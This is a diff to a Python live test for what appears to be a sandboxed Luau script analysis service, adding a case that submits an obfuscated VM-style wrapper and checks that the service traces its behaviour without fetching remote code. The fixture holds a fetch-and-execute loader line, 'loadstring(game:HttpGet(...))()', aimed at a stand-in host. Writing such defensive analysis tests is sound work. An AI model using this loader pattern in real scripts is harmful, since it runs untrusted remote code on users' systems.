@@ -20,7 +20,7 @@ deadline=time.monotonic()+240
 while True:
     try:
         health=request('/api/health')
-        if health.get('ok') and health.get('siteVersion')=='2.0.0':break
+        if health.get('ok') and health.get('siteVersion')=='2.1.0':break
     except Exception:pass
     if time.monotonic()>deadline:raise RuntimeError('New healthy deployment did not appear before the deadline')
     time.sleep(5)
@@ -48,4 +48,22 @@ for name,source,mode,outcome in fixtures:
     original=request('/api/jobs/'+job['id']+'/artifact?name=original.input.luau')
     assert original['sha256']==hashlib.sha256(source.encode()).hexdigest()
     print('LIVE PASS:',name,'outcome='+outcome,'selected='+job['primary'])
-print('LIVE SUMMARY: 3/3 synthetic public-API cases passed; no referenced URLs fetched.')
+# VM-shaped wrapper: execute only against inert host stubs and require a
+# concise behavior artifact without fetching the referenced body.
+vm='return(function(...) local a=function()end;local b=function()end;local c=function()end;local d=function()end;local state=1;while state do if state==1 then state=nil;loadstring(game:HttpGet("https://example.invalid/payload.lua"))() end end end)()'
+job=request('/api/jobs',{'source':vm,'name':'vm-loader.luau','mode':'sandboxed','timeout':30})
+end=time.monotonic()+45
+while job['state'] not in ('completed','partial','failed','unsupported','cancelled'):
+    if time.monotonic()>end:raise RuntimeError('vm-loader: job timeout')
+    time.sleep(.5);job=request('/api/jobs/'+job['id'])
+assert job['state']=='partial',job
+assert job['quality']['hostTraceExecuted'] is True,job['quality']
+assert job['quality']['hostTraceProfilesMatched'] is True,job['quality']
+assert job['quality']['remoteBodiesFetched'] is False,job['quality']
+assert job['quality']['remoteBodiesExecuted'] is False,job['quality']
+assert job['quality']['behavioralArtifact']=='program.behavioral.luau',job['quality']
+artifact=request('/api/jobs/'+job['id']+'/artifact?name=program.behavioral.luau')
+assert 'https://example.invalid/payload.lua' in artifact['text']
+assert 'loadstring(game:HttpGet' in artifact['text']
+print('LIVE PASS: vm-loader host trace selected behavior artifact; no referenced URL fetched.')
+print('LIVE SUMMARY: 4/4 synthetic public-API cases passed; no referenced URLs fetched.')
